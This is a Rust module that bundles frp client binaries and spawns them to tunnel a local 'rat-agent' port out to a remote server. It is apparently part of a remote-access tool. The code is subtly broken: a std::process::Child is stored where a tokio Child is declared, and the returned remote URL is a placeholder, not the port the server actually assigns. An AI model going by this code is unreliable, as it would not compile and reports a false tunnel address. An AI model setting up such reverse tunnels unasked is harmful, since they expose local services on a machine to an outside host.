use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use tokio::process::Child;

#[derive(Debug, Clone)]
pub struct FrpConfig {
    pub server_addr: String,
    pub server_port: u16,
    pub auth_token: Option<String>,
    pub tls_enabled: bool,
}

#[derive(Debug)]
pub struct FrpTunnel {
    pub local_port: u16,
    pub remote_url: String,
    pub process: Child,
    pub temp_dir: PathBuf,
}

pub struct FrpManager {
    config: FrpConfig,
}

impl FrpManager {
    pub fn new(config: FrpConfig) -> Self {
        Self { config }
    }

    /// Create a tunnel for an agent listening on the given local port
    pub async fn create_tunnel(&self, local_port: u16) -> Result<FrpTunnel, Box<dyn std::error::Error>> {
        // Create temporary directory for frp binary and config
        let temp_dir = std::env::temp_dir().join(format!("rat-frp-{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&temp_dir)?;

        // Extract the appropriate frp binary for the current platform
        let binary_path = self.extract_binary(&temp_dir)?;

        // Generate frp config
        let config_path = temp_dir.join("frpc.toml");
        self.generate_config(&config_path, local_port)?;

        // Start frpc process
        let child = Command::new(&binary_path)
            .arg("-c")
            .arg(&config_path)
            .current_dir(&temp_dir)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        // For now, generate a placeholder remote URL
        // In a real implementation, you'd need to query the frp server for the assigned port
        // or use a predetermined port mapping
        let remote_url = format!("{}:{}", self.config.server_addr, 20000 + local_port);

        Ok(FrpTunnel {
            local_port,
            remote_url,
            process: child,
            temp_dir,
        })
    }

    fn extract_binary(&self, temp_dir: &PathBuf) -> Result<PathBuf, Box<dyn std::error::Error>> {
        let (binary_data, binary_name) = self.get_platform_binary()?;
        let binary_path = temp_dir.join(binary_name);

        let mut file = fs::File::create(&binary_path)?;
        file.write_all(binary_data)?;
        file.flush()?;

        // Make executable on Unix systems
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(&binary_path)?.permissions();
            perms.set_mode(0o755);
            fs::set_permissions(&binary_path, perms)?;
        }

        Ok(binary_path)
    }

    fn get_platform_binary(&self) -> Result<(&'static [u8], &'static str), Box<dyn std::error::Error>> {
        #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
        {
            Ok((include_bytes!("../assets/frp/frpc_linux_amd64"), "frpc"))
        }

        #[cfg(all(target_os = "macos", target_arch = "x86_64"))]
        {
            Ok((include_bytes!("../assets/frp/frpc_darwin_amd64"), "frpc"))
        }

        #[cfg(all(target_os = "macos", target_arch = "aarch64"))]
        {
            Ok((include_bytes!("../assets/frp/frpc_darwin_arm64"), "frpc"))
        }

        #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
        {
            Ok((include_bytes!("../assets/frp/frpc_windows_amd64.exe"), "frpc.exe"))
        }

        #[cfg(not(any(
            all(target_os = "linux", target_arch = "x86_64"),
            all(target_os = "macos", target_arch = "x86_64"),
            all(target_os = "macos", target_arch = "aarch64"),
            all(target_os = "windows", target_arch = "x86_64")
        )))]
        {
            Err("Unsupported platform for bundled frp".into())
        }
    }

    fn generate_config(&self, config_path: &PathBuf, local_port: u16) -> Result<(), Box<dyn std::error::Error>> {
        let mut config = format!(r#"
serverAddr = "{}"
serverPort = {}

[[proxies]]
name = "rat-agent-{}"
type = "tcp"
localIP = "127.0.0.1"
localPort = {}
remotePort = 0
"#,
            self.config.server_addr,
            self.config.server_port,
            local_port,
            local_port
        );

        if let Some(token) = &self.config.auth_token {
            config.push_str(&format!("auth.method = \"token\"\nauth.token = \"{}\"\n", token));
        }

        if self.config.tls_enabled {
            config.push_str("transport.tls.enable = true\n");
        }

        fs::write(config_path, config)?;
        Ok(())
    }
}

impl Drop for FrpTunnel {
    fn drop(&mut self) {
        // Clean up the process and temp directory
        let _ = self.process.kill();
        let _ = fs::remove_dir_all(&self.temp_dir);
    }
}

impl FrpTunnel {
    /// Wait for the tunnel to be established (basic implementation)
    pub async fn wait_ready(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Simple wait - in practice, you'd parse frpc output or use a health check
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
        Ok(())
    }

    /// Get the remote URL for this tunnel
    pub fn remote_url(&self) -> &str {
        &self.remote_url
    }
}